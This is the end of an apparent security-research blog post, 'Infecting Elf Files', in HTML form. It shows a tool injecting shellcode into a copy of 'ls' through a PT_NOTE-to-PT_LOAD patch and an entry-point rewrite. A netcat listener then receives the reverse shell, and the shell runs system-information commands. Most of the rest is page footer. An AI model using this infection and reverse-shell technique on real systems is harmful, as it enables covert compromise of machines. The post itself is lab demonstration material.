+</span></span><span class="line"><span class="cl">hexagr@vr:~/elf$ ./elf_infector ./ls shellcode
+</span></span><span class="line"><span class="cl">[+] Found PT_NOTE section
+</span></span><span class="line"><span class="cl">[+] Changing to PT_LOAD
+</span></span><span class="line"><span class="cl">[+] Patched e_entry
+</span></span><span class="line"><span class="cl">hexagr@vr:~/elf$ ./ls
+</span></span><span class="line"><span class="cl">elf_infector  elf_infector.c  ls  shellcode  shellcode.s
+</span></span></code></pre></div><p>Meanwhile&hellip; in our other console</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-plaintext" data-lang="plaintext"><span class="line"><span class="cl">hexagr@vr:~/elf$ nc -lvnp 4444
+</span></span><span class="line"><span class="cl">Listening on 0.0.0.0 4444
+</span></span><span class="line"><span class="cl">Connection received on 127.0.0.1 51020
+</span></span><span class="line"><span class="cl">cat /etc/issue
+</span></span><span class="line"><span class="cl">Ubuntu 24.04.2 LTS \n \l
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">uname -a
+</span></span><span class="line"><span class="cl">Linux vr 6.8.0-53-generic #55-Ubuntu SMP PREEMPT_DYNAMIC Fri Jan 17 15:37:52 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
+</span></span></code></pre></div><p><a href="https://github.com/hexagr/elf_infector">ELF Infector on Github</a></p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/elf/">ELF</a></li>
+      <li><a href="http://localhost:1313/tags/linux/">Linux</a></li>
+      <li><a href="http://localhost:1313/tags/research/">Research</a></li>
+      <li><a href="http://localhost:1313/tags/development/">Development</a></li>
+    </ul>
+<nav class="paginav">
+  <a class="next" href="http://localhost:1313/posts/a-sideblog-on-blogspot/">
+    <span class="title">Next »</span>
+    <br>
+    <span>A Sideblog on Blogspot</span>
+  </a>
+</nav>
+
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Infecting Elf Files on x"
+            href="https://x.com/intent/tweet/?text=Infecting%20Elf%20Files&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2finfecting-elf-files%2f&amp;hashtags=ELF%2clinux%2cresearch%2cdevelopment">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Infecting Elf Files on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2finfecting-elf-files%2f&amp;title=Infecting%20Elf%20Files&amp;summary=Infecting%20Elf%20Files&amp;source=http%3a%2f%2flocalhost%3a1313%2fposts%2finfecting-elf-files%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Infecting Elf Files on reddit"
+            href="https://reddit.com/submit?url=http%3a%2f%2flocalhost%3a1313%2fposts%2finfecting-elf-files%2f&title=Infecting%20Elf%20Files">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-3.446,265.638c0,-22.964 -18.616,-41.58 -41.58,-41.58c-11.211,0 -21.361,4.457 -28.841,11.666c-28.424,-20.508 -67.586,-33.757 -111.204,-35.278l18.941,-89.121l61.884,13.157c0.756,15.734 13.642,28.29 29.56,28.29c16.407,0 29.706,-13.299 29.706,-29.701c0,-16.403 -13.299,-29.702 -29.706,-29.702c-11.666,0 -21.657,6.792 -26.515,16.578l-69.105,-14.69c-1.922,-0.418 -3.939,-0.042 -5.585,1.036c-1.658,1.073 -2.811,2.761 -3.224,4.686l-21.152,99.438c-44.258,1.228 -84.046,14.494 -112.837,35.232c-7.468,-7.164 -17.589,-11.591 -28.757,-11.591c-22.965,0 -41.585,18.616 -41.585,41.58c0,16.896 10.095,31.41 24.568,37.918c-0.639,4.135 -0.99,8.328 -0.99,12.576c0,63.977 74.469,115.836 166.33,115.836c91.861,0 166.334,-51.859 166.334,-115.836c0,-4.218 -0.347,-8.387 -0.977,-12.493c14.564,-6.47 24.735,-21.034 24.735,-38.001Zm-119.474,108.193c-20.27,20.241 -59.115,21.816 -70.534,21.816c-11.428,0 -50.277,-1.575 -70.522,-21.82c-3.007,-3.008 -3.007,-7.882 0,-10.889c3.003,-2.999 7.882,-3.003 10.885,0c12.777,12.781 40.11,17.317 59.637,17.317c19.522,0 46.86,-4.536 59.657,-17.321c3.016,-2.999 7.886,-2.995 10.885,0.008c3.008,3.011 3.003,7.882 -0.008,10.889Zm-5.23,-48.781c-16.373,0 -29.701,-13.324 -29.701,-29.698c0,-16.381 13.328,-29.714 29.701,-29.714c16.378,0 29.706,13.333 29.706,29.714c0,16.374 -13.328,29.698 -29.706,29.698Zm-160.386,-29.702c0,-16.381 13.328,-29.71 29.714,-29.71c16.369,0 29.689,13.329 29.689,29.71c0,16.373 -13.32,29.693 -29.689,29.693c-16.386,0 -29.714,-13.32 -29.714,-29.693Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Infecting Elf Files on facebook"
+            href="https://facebook.com/sharer/sharer.php?u=http%3a%2f%2flocalhost%3a1313%2fposts%2finfecting-elf-files%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-106.468,0l0,-192.915l66.6,0l12.672,-82.621l-79.272,0l0,-53.617c0,-22.603 11.073,-44.636 46.58,-44.636l36.042,0l0,-70.34c0,0 -32.71,-5.582 -63.982,-5.582c-65.288,0 -107.96,39.569 -107.96,111.204l0,62.971l-72.573,0l0,82.621l72.573,0l0,192.915l-191.104,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Infecting Elf Files on whatsapp"
+            href="https://api.whatsapp.com/send?text=Infecting%20Elf%20Files%20-%20http%3a%2f%2flocalhost%3a1313%2fposts%2finfecting-elf-files%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-58.673,127.703c-33.842,-33.881 -78.847,-52.548 -126.798,-52.568c-98.799,0 -179.21,80.405 -179.249,179.234c-0.013,31.593 8.241,62.428 23.927,89.612l-25.429,92.884l95.021,-24.925c26.181,14.28 55.659,21.807 85.658,21.816l0.074,0c98.789,0 179.206,-80.413 179.247,-179.243c0.018,-47.895 -18.61,-92.93 -52.451,-126.81Zm-126.797,275.782l-0.06,0c-26.734,-0.01 -52.954,-7.193 -75.828,-20.767l-5.441,-3.229l-56.386,14.792l15.05,-54.977l-3.542,-5.637c-14.913,-23.72 -22.791,-51.136 -22.779,-79.287c0.033,-82.142 66.867,-148.971 149.046,-148.971c39.793,0.014 77.199,15.531 105.329,43.692c28.128,28.16 43.609,65.592 43.594,105.4c-0.034,82.149 -66.866,148.983 -148.983,148.984Zm81.721,-111.581c-4.479,-2.242 -26.499,-13.075 -30.604,-14.571c-4.105,-1.495 -7.091,-2.241 -10.077,2.241c-2.986,4.483 -11.569,14.572 -14.182,17.562c-2.612,2.988 -5.225,3.364 -9.703,1.12c-4.479,-2.241 -18.91,-6.97 -36.017,-22.23c-13.314,-11.876 -22.304,-26.542 -24.916,-31.026c-2.612,-4.484 -0.279,-6.908 1.963,-9.14c2.016,-2.007 4.48,-5.232 6.719,-7.847c2.24,-2.615 2.986,-4.484 4.479,-7.472c1.493,-2.99 0.747,-5.604 -0.374,-7.846c-1.119,-2.241 -10.077,-24.288 -13.809,-33.256c-3.635,-8.733 -7.327,-7.55 -10.077,-7.688c-2.609,-0.13 -5.598,-0.158 -8.583,-0.158c-2.986,0 -7.839,1.121 -11.944,5.604c-4.105,4.484 -15.675,15.32 -15.675,37.364c0,22.046 16.048,43.342 18.287,46.332c2.24,2.99 31.582,48.227 76.511,67.627c10.685,4.615 19.028,7.371 25.533,9.434c10.728,3.41 20.492,2.929 28.209,1.775c8.605,-1.285 26.499,-10.833 30.231,-21.295c3.732,-10.464 3.732,-19.431 2.612,-21.298c-1.119,-1.869 -4.105,-2.99 -8.583,-5.232Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Infecting Elf Files on telegram"
+            href="https://telegram.me/share/url?text=Infecting%20Elf%20Files&amp;url=http%3a%2f%2flocalhost%3a1313%2fposts%2finfecting-elf-files%2f">
+            <svg version="1.1" xml:space="preserve" viewBox="2 2 28 28" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M26.49,29.86H5.5a3.37,3.37,0,0,1-2.47-1,3.35,3.35,0,0,1-1-2.47V5.48A3.36,3.36,0,0,1,3,3,3.37,3.37,0,0,1,5.5,2h21A3.38,3.38,0,0,1,29,3a3.36,3.36,0,0,1,1,2.46V26.37a3.35,3.35,0,0,1-1,2.47A3.38,3.38,0,0,1,26.49,29.86Zm-5.38-6.71a.79.79,0,0,0,.85-.66L24.73,9.24a.55.55,0,0,0-.18-.46.62.62,0,0,0-.41-.17q-.08,0-16.53,6.11a.59.59,0,0,0-.41.59.57.57,0,0,0,.43.52l4,1.24,1.61,4.83a.62.62,0,0,0,.63.43.56.56,0,0,0,.4-.17L16.54,20l4.09,3A.9.9,0,0,0,21.11,23.15ZM13.8,20.71l-1.21-4q8.72-5.55,8.78-5.55c.15,0,.23,0,.23.16a.18.18,0,0,1,0,.06s-2.51,2.3-7.52,6.8Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share Infecting Elf Files on ycombinator"
+            href="https://news.ycombinator.com/submitlink?t=Infecting%20Elf%20Files&u=http%3a%2f%2flocalhost%3a1313%2fposts%2finfecting-elf-files%2f">
+            <svg version="1.1" xml:space="preserve" width="30px" height="30px" viewBox="0 0 512 512" fill="currentColor"
+                xmlns:inkscape="http://www.inkscape.org/namespaces/inkscape">
+                <path
+                    d="M449.446 0C483.971 0 512 28.03 512 62.554L512 449.446C512 483.97 483.97 512 449.446 512L62.554 512C28.03 512 0 483.97 0 449.446L0 62.554C0 28.03 28.029 0 62.554 0L449.446 0ZM183.8767 87.9921H121.8427L230.6673 292.4508V424.0079H281.3328V292.4508L390.1575 87.9921H328.1233L256 238.2489z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2025 <a href="http://localhost:1313/">Stephan Bridger</a></span> · 
+
+    <span>
+        Powered by 
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+        <br><br>
+        <hr>
+            <br>
+    <a href="https://github.com/hexagr/" title="Stephan Bridger on Github">github</a> / 
+<a href="https://hackerone.com/hexagr/badges/" title="Stephan Bridger on HackerOne">hackerone</a> / 
+<a href="https://x.com/hexagr" title="Stephan Bridger on X.com">x</a> / 
+<a href="https://flickr.com/hexagr" title="Stephan Bridger on flickr">flickr</a> / 
+<a href="https://mastodon.social/@hexagr" rel="me" title="Stephan Bridger on mastodon">mastodon</a> / 
+<a href="https://bsky.app/profile/hexagr.bsky.social" title="Stephan Bridger on bluesky">bluesky</a> / 
+<a href="https://hexagr.blogspot.com" title="Stephan Bridger on blogspot">blogspot</a> / 
+<a href="https://vimeo.com/hexagr" title="Stephan Bridger on vimeo">vimeo</a> / 
+<a href="https://bugcrowd.com/hexagr" title="Stephan Bridger on bugcrowd">bugcrowd</a> / 
+<a href="https://gitlab.com/hexagr" title="Stephan Bridger on gitlab">gitlab</a> / 
+<a href="https://youtube.com/@hexagr/" title="Stephan Bridger on youtube">youtube</a> / 
+<a href="https://hexagr.tumblr.com" title="Stephan Bridger on tumblr">tumblr</a>
+
+    </span>
+  <span>
+
+    
+
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
